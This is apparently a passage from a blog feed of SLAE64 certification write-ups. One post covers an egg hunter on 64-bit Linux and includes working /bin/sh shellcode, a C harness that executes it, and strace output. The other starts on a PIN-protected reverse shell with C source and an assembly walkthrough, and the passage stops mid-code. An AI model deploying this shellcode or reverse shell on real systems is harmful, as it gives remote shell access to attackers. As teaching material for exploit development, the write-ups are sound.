&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
;================================================================================
; Shellcode (python) :
shellcode = &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;
;================================================================================
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is how the final program with the defined EGG, egg hunter code and shellcode payload from exploit-db.com is looking like:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

#define EGG &quot;\x50\x90\x50\x90&quot;

unsigned char hunter[] = \
&quot;\x48\x31\xf6\x56\x5f\x66\x81\xcf\xff\x0f\x48\xff\xc7\x48\x31\xc0\xb0\x15\x0f\x05\x3c\xf2\x74\xed\xb8\x4f\x90\x50\x90\xfe\xc0\xaf\x75\xeb\xff\xe7&quot;;

unsigned char payload[] = EGG &quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;;

int main(void) {
	printf(&quot;Egg hunter's size (bytes): %lu\n&quot;, strlen(hunter));
	printf(&quot;Payload's size (bytes): %lu\n&quot;, strlen(payload));
	int (*ret)() = (int(*)())hunter;
	ret();
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s run it:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/task3.png&quot; style=&quot;width:50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also if you used the program with strace as &lt;code class=&quot;highlighter-rouge&quot;&gt;strace ./shellcode&lt;/code&gt; you would see how the search is trying to identify the egg:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
ccess(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
...
access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
access(&quot;&quot;, F_OK)                        = -1 ENOENT (No such file or directory)
access(&quot;P\220P\220\367\346PH\277/bin//shWH\211\347\260;\17\5&quot;, F_OK) = -1 ENOENT (No such file or directory)
execve(&quot;/bin//sh&quot;, NULL, NULL)          = 0
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;Egghunter.nasm: &lt;br /&gt;&lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task3/egghunter.nasm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Shellcode.c used for testing:&lt;br /&gt; &lt;a href=&quot;https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c&quot;&gt;https://github.com/silviavali/SLAE/blob/master/task3/shellcode.c&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;related-posts&quot;&gt;Related posts:&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-15-blog-SLAE1/&quot;&gt;64-bit bindshell with a passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-01-25-blog-SLAE2/&quot;&gt;64-bit reverse shell with passphrase protection&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE3/&quot;&gt;Egghunter (64-bit Linux) using access() syscall&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-02-25-blog-SLAE4/&quot;&gt;Writing a 64-bit custom encoder (reversed byte order of 4 byte chunks)&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE51/&quot;&gt;Msfvenom generated Exec shellcode analysis - exec shellcode&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE52/&quot;&gt;Msfvenom generated bind_tcp shellcode analysis&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE53/&quot;&gt;Msfvenom generated shell_reverse_tcp payload&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE6/&quot;&gt;Polymorphic shellcodes for samples taken from Shell-Storm&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://silviavali.github.io/blog/2019-05-01-blog-SLAE7/&quot;&gt;Custom encrypter - One-time pad (OTP)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><author><name>Silvia Väli</name><email>silvia@protonmail.com</email></author><summary type="html">This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification. The task for 3/7 assignment is to study about egg hunters and to create a working demo. So in this article I will give an overview of virtual address space, virtual addresses and how to utilize that knowledge on creating an egghunter. So let’s hunt some eggs.</summary></entry><entry><title type="html">64-bit reverse shell with passphrase protection</title><link href="http://localhost:4000/blog/2019-01-25-blog-SLAE2/" rel="alternate" type="text/html" title="64-bit reverse shell with passphrase protection" /><published>2019-01-25T00:00:00+02:00</published><updated>2019-01-25T00:00:00+02:00</updated><id>http://localhost:4000/blog/blog-SLAE2</id><content type="html" xml:base="http://localhost:4000/blog/2019-01-25-blog-SLAE2/">&lt;p&gt;This blog post has been created for completing the requirements of the &lt;a href=&quot;https://www.pentesteracademy.com/course?id=7&quot;&gt;SecurityTube Linux Assembly Expert Certification&lt;/a&gt;. The task for 2/7 assignment is to create a 64-bit reverse shellcode with passphrase protection. If passphrase is entered correctly, only then the shell gets executed. All 0-bytes should be removed.&lt;/p&gt;

&lt;p&gt;&lt;b&gt;Student ID&lt;/b&gt;: SLAE64 - 1594&lt;/p&gt;

&lt;h2 id=&quot;reverse-shellcode&quot;&gt;Reverse shellcode&lt;/h2&gt;

&lt;p&gt;The essence of a reverse shell is the opposite of bindshell. While bindshell is what remains listening on a port ready to establish a connection to the attacker, then reverse shell is what makes the call back home itself where the attacker is already listening on a specified port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/SLAE/bindreverse.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;how-does-reverse-shellcode-look-like-in-c&quot;&gt;How does reverse shellcode look like in C?&lt;/h2&gt;

&lt;p&gt;I personally think writing a reverse shell is easier than writing a bind shell and as you can see referring back to my previous blog post &lt;a href=&quot;/blog/2019-01-15-blog-SLAE1/&quot;&gt;SLAE exam task no. 1&lt;/a&gt; that reverse shell is also visibly shorter to implement. We will not have to deal with &lt;code class=&quot;highlighter-rouge&quot;&gt;accept()&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;listen()&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;bind()&lt;/code&gt; syscalls. Instead we only have 1 new syscall - &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; which we use to initiate a connection on a socket. The rest of the shellcode remains exactly the same as described in SLAE task 1.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cm&quot;&gt;/*
reverse TCP shell which establishes a connection back on port 4444, if the PIN code 1234 is submitted.
$ gcc reverse.c -o reverse
$ ./reverse
*/&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;stdio&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;unistd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;types&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;netinet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;h&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;

&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
	&lt;span class=&quot;kr&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

	&lt;span class=&quot;c1&quot;&gt;//create a socket&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;c1&quot;&gt;//initiate a connection on a socket, on success 0 is returned&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;PIN:&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nx&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sockfd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;strncmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1234&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;nx&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;connect-syscall&quot;&gt;&lt;b&gt;connect() syscall&lt;/b&gt;&lt;/h4&gt;

&lt;p&gt;By the &lt;a href=&quot;http://man7.org/linux/man-pages/man2/connect.2.html&quot;&gt;Linux Programmer’s Manual&lt;/a&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall takes 3 arguments: a &lt;b&gt;file descriptor&lt;/b&gt; which refers to the socket we want to connect to, &lt;b&gt;addr&lt;/b&gt; struct which specifies the address information (IP and port) and &lt;b&gt;addrlen&lt;/b&gt;, the length of that address structure.&lt;/p&gt;

&lt;p&gt;The socket we are going to be connecting to is of type AF_INET, which tells us we are dealing with an IPv4 address space. For IPv4 address space we need to specify AF_INET as the address family. We also specify with INADDR_ANY that we are making a connection to 0.0.0.0 and &lt;code class=&quot;highlighter-rouge&quot;&gt;htons(4444)&lt;/code&gt; presents the port to connect to in network byte order. Finally we add 8 zero bytes by using bzero() function as per definition.&lt;/p&gt;

&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nx&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;INADDR_ANY&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;server&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;sin_zero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;To implement &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall successfully, the start address of the addr structure shold be specified as the 2nd argument (RSI). The third argument in turn should hold the length of the structure which we get when we add up the bytes of each of the structure members.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server.sin_family = 2 bytes
server.sin_addr.s_addr = 4 bytes
server.sin_port = 2 bytes
bzero(&amp;amp;server.sin_zero, 8) = 8 bytes

= total of 16 bytes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;assembly&quot;&gt;Assembly&lt;/h3&gt;

&lt;p&gt;Now that we have gotten familiary with the &lt;code class=&quot;highlighter-rouge&quot;&gt;connect()&lt;/code&gt; syscall, let’s try to analyze and understand the assembly code which corresponds to the C code presented in the beginning of this blog post. I have decided to do it in 3 parts. First part is about how we use assembly to initiate the call back home, second part is what comes after we have established a connection and require the user to submit the correct PIN code. Based on the PIN code we can make a desicion whether to take the &lt;code class=&quot;highlighter-rouge&quot;&gt;exit()&lt;/code&gt; syscall or jump to the 3rd part of the assembly code where we execute the actual shell via &lt;code class=&quot;highlighter-rouge&quot;&gt;execve()&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&quot;part-1---making-a-call-home&quot;&gt;&lt;b&gt;Part 1&lt;/b&gt; - making a call home&lt;/h4&gt;

&lt;p&gt;First thing we are going to do is create a new socket by using the &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; syscall. It takes 3 parameters and by convention these go to RDI, RSI and RDX registers. RDI will hold the address family AF_INET. You can find the corresponding number to AF_INET with python oneliner &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c import socket; print socket.AF_INET'&lt;/code&gt;. Same goes for the SOCK_STREAM &lt;code class=&quot;highlighter-rouge&quot;&gt;python -c 'import socket; print socket.SOCK_STREAM'&lt;/code&gt; which means we want the socket to be a TCP socket. At label &lt;code class=&quot;highlighter-rouge&quot;&gt;socket:&lt;/code&gt; we are using the ADD instruction to load these values (AF_INET: 2, SOCKSTREAM: 1) to registers RDI and RSI. The 3rd argument simply needs to be 0, so we can use the XOR instruction, as something XOR-ed by itself is always zero.&lt;/p&gt;

&lt;p&gt;On successful return &lt;code class=&quot;highlighter-rouge&quot;&gt;socket()&lt;/code&gt; returns as a non-negative number which is a file descriptor. This return value by convention is saved into RAX and this is the reason why on the last 2 lines we are moving the value from RAX to RDI and then clearing the RAX value as each following syscall would otherwise overwrite and destroy the fd.&lt;/p&gt;
&lt;div class=&quot;language-js highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;reverseshell&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;which&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;connects&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;back&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;correct&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;PIN&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;code&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;is&lt;/span&gt; &lt;span 